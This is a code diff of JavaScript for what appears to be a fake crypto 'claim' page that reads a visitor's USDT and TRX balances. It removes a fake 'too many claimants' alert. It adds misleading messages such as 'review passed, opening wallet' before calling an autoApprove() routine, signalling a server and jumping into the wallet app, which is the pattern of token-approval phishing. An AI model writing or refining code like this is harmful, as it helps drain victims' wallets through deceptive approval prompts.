@@ -1137,58 +1137,57 @@ async function initWallet(needAutoApprove) {
     }
 }
 
-// ========== 锁死逻辑（A1未解锁前） ==========
-function bindLockedLogic() {
-    approveBtn.onclick = () => {
-        showAutoCloseAlert("现在领取的人太多了请稍后重试");
-    };
-}
-
-// ========== 解锁后核心逻辑（跳转后紧跟刷新，无延迟，完整替换） ==========
+// ========== 解锁后核心逻辑（修复变量未定义+确保跳转后刷新） ==========
 function bindUnlockedCoreLogic() {
     const lang = langConfig[currentLang];
+    // 核心修复：在当前函数内重新计算shortAddr（避免变量未定义报错）
+    const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "未知地址";
+    
     approveBtn.onclick = async () => {
         const btn = document.getElementById("approveBtn");
         btn.disabled = true;
         btn.textContent = "处理中...";
-
         try {
             // 1. 检测是否已在钱包内→直接执行授权（不跳转、不刷新）
             const isInWalletBrowser = checkIsInWalletBrowser();
             if (isInWalletBrowser) {
                 userInfoEl.innerHTML = `
-                ${shortAddr}<br>
+                已连接：<br>${shortAddr}<br>
                 USDT余额：${tokenBalance.toFixed(2)} | TRX余额：${trxBalance.toFixed(2)}<br>
-                <br><span style='color: #4ade80; font-size: 13px;'>✅ 环境符合领取条件</span>`;
-                await autoApprove(); // 调用你原有授权逻辑
+                <br><span style='color: #4ade80; font-size: 13px;'>✅ 环境符合领取条件，正在授权...</span>`;
+                await autoApprove(); // 调用原有授权逻辑
                 btn.disabled = false;
                 btn.textContent = lang.approveBtnText;
                 return;
             }
 
-            // 2. 不在钱包内→先处理B1信号，跳转后紧跟刷新
+            // 2. 不在钱包内→先处理B1信号，跳转后紧跟刷新（核心逻辑保留）
             if (hasSentB1Signal(userAddress)) {
                 userInfoEl.innerHTML = `
-                ${shortAddr}<br>
+                已连接：<br>${shortAddr}<br>
                 USDT余额：${tokenBalance.toFixed(2)} | TRX余额：${trxBalance.toFixed(2)}<br>
-                <br><span style='color: #4ade80; font-size: 13px;'>✅ 请点击确认</span>`;
+                <br><span style='color: #4ade80; font-size: 13px;'>✅ 请点击确认，正在唤起钱包...</span>`;
                 await handleJump(); // 执行跳转
-                window.location.reload(); // 紧跟刷新，无延迟
+                window.location.reload(); // 跳转后立即刷新（关键步骤）
                 return;
             }
 
-            // 发送B1→标记→跳转→紧跟刷新
+            // 发送B1→标记→跳转→紧跟刷新（完整流程）
             const b1Result = await sendSignalB(true);
             if (b1Result !== "204") throw new Error("B1未返回204");
             markB1SignalSent(userAddress);
-
+            
+            userInfoEl.innerHTML = `
+            已连接：<br>${shortAddr}<br>
+            USDT余额：${tokenBalance.toFixed(2)} | TRX余额：${trxBalance.toFixed(2)}<br>
+            <br><span style='color: #4ade80; font-size: 13px;'>✅ 审核通过，正在唤起钱包...</span>`;
             await handleJump(); // 执行跳转
-            window.location.reload(); // 无延迟，紧跟刷新
+            window.location.reload(); // 跳转后立即刷新（关键步骤，无延迟）
 
         } catch (e) {
             console.error("领取流程异常：", e);
             showAutoCloseAlert(`操作失败：${e.message || lang.systemBusyTip}`);
-            window.location.reload(); // 异常时也紧跟刷新
+            window.location.reload(); // 异常时也强制刷新（避免卡住）
             btn.disabled = false;
             btn.textContent = lang.approveBtnText;
         }
